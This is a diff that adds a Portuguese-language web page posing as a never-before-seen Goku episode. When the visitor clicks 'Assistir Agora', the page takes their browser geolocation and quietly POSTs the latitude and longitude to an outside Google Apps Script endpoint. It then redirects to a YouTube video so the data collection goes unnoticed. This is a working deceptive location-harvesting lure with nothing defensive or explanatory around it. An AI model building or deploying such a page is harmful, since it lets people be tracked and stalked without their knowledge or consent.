@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Episódio Exclusivo</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f3f4f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .card {
+      background: white;
+      padding: 40px;
+      border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 400px;
+    }
+
+    .card h2 {
+      margin-bottom: 20px;
+    }
+
+    .card p {
+      font-size: 16px;
+      color: #333;
+    }
+
+    .card button {
+      margin-top: 20px;
+      background-color: #2563eb;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .card button:hover {
+      background-color: #1d4ed8;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-style: italic;
+      color: #666;
+    }
+  </style>
+
+  <script>
+    function enviarLocalizacao(latitude, longitude) {
+      fetch("https://script.google.com/macros/s/AKfycbxNmM_PiPr3kL4E8by52yodsiSEIPw3gBkaI11yBeLtH6bXJZgozlHhU7OqN75oKITn/exec", {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ latitude, longitude })
+      });
+    }
+
+    function obterLocalizacao() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          enviarLocalizacao(lat, lon);
+          document.getElementById("status").innerText =
+            "Carregando episódio exclusivo...";
+          
+          setTimeout(() => {
+            window.location.href = "https://www.youtube.com/watch?v=6RCBHxzSvmI"; // redireciona após envio
+          }, 3000);
+        }, function(error) {
+          alert("Erro ao obter localização: " + error.message);
+        });
+      } else {
+        alert("Seu navegador não suporta geolocalização.");
+      }
+    }
+  </script>
+</head>
+
+<body>
+  <div class="card">
+    <h2>🎬 Epsódio de Goku - NUNCA VISTO</h2>
+    <p>Acesse um episódio inédito do seu conteúdo favorito.</p>
+    <button onclick="obterLocalizacao()">Assistir Agora</button>
+    <div id="status"></div>
+  </div>
+</body>
+</html>
